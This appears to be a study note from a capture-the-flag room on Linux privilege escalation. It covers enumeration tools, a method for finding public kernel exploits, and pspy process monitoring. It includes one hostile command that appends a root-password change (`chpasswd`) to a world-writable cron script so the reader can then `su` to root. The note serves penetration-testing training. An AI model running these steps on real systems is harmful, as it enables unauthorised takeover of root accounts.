# Linux Privilege Escalation: Automation

**Room:** Linux Privilege Escalation: Automation
**Date:** July 01, 2026

---

## 1. Automated Enumeration Tools

Use these tools to speed up enumeration. No single tool catches everything — know more than one.

| Tool | Purpose |
|------|---------|
| [LinPeas](https://github.com/carlospolop/PEASS-ng) | Highlights privesc paths — misconfigs, weak permissions, credentials |
| [LinEnum](https://github.com/rebootuser/LinEnum) | Dumps system info, users, crons, and SUID binaries in a readable report |
| [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester) | Matches kernel version against known CVEs and suggests local exploits |
| [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) | Adjustable verbosity — starts quiet, reveals more detail as level increases |
| [Linux Priv Checker](https://github.com/linted/linuxprivchecker) | Enumerates system info and flags common privesc opportunities inline |

> **Note:** Tool availability depends on the target environment (e.g., Python must be installed to run Python-based tools).

---

## 2. Public Exploits

### Methodology

Follow this process — skipping steps wastes time or crashes machines:

1. **Enumerate** — Identify software versions, kernel version, distro, SUID binaries, and services running as root.
2. **Research** — Search for known CVEs matching what you found. Check if a public exploit exists.
3. **Evaluate** — Read the exploit code. Check requirements (gcc on target? specific kernel version? architecture?).
4. **Exploit** — Transfer to target, compile if needed, and run.
5. **Verify** — Confirm elevated privileges with `whoami`, `id`, and by accessing restricted resources.

### Enumerate Kernel Version

```bash
uname -r
uname -a
cat /etc/os-release
```

### Finding Exploits

**searchsploit** (offline Exploit-DB, pre-installed on Kali):

```bash
searchsploit <software> <version>
```

**GitHub** — Search for CVE-specific exploit repos:

```
CVE-<id> github
```

**Automated tools** — LinPeas and similar tools flag vulnerable software versions and often include the CVE number directly.

### Transferring Exploits to Target

```bash
scp <file> <user>@<TARGET_IP>:/home/<user>/
```

---

## 3. pspy — Process Monitoring Without Root

**Purpose:** Observe running processes, cron jobs, and commands executed by other users in real time — without root privileges.

**Why it's needed:** Automated scanners only capture a snapshot. Short-lived processes (cron jobs, scripts that run and exit in milliseconds) are invisible to them.

**How it works:** Uses `inotify` watches on key directories (`/etc`, `/tmp`, `/usr`, `/var`). When filesystem activity is detected, it scans `/proc` to capture the process's UID, PID, timestamp, and full command — fast enough to catch short-lived tasks.

### Usage

```bash
./pspy64
```

### Interpreting Output

Look for processes running as `UID=0` (root) — especially scripts in writable locations:

```
CMD: UID=0   PID=1937   | /bin/bash /root/run-backup.sh
CMD: UID=0   PID=1943   | /bin/bash /usr/local/bin/rm-tmp.sh
```

### Exploitation Workflow

1. Identify a root-owned script that is world-writable:

```bash
ls -la /usr/local/bin/rm-tmp.sh
# -rwxrwxrwx 1 root root ...
```

2. Append a privilege escalation command to the script:

```bash
echo 'echo "root:newpass" | chpasswd' >> /usr/local/bin/rm-tmp.sh
```

3. Wait for the cron job to run, then switch to root:

```bash
su
# enter: newpass
```

---

## Quick Reference — Key Commands

| Task | Command |
|------|---------|
| Check kernel version | `uname -r` / `uname -a` |
| Check OS info | `cat /etc/os-release` |
| Search for exploits | `searchsploit <software> <version>` |
| Transfer exploit to target | `scp <file> <user>@<IP>:/home/<user>/` |
| Run pspy | `./pspy64` |
| Check file permissions | `ls -la <file>` |
| Append to writable script | `echo '<command>' >> <script>` |
| Switch to root | `su` |

---

*Reference: [GTFOBins](https://gtfobins.github.io) · [Exploit-DB](https://www.exploit-db.com) · [pspy GitHub](https://github.com/DominicBreuker/pspy)*
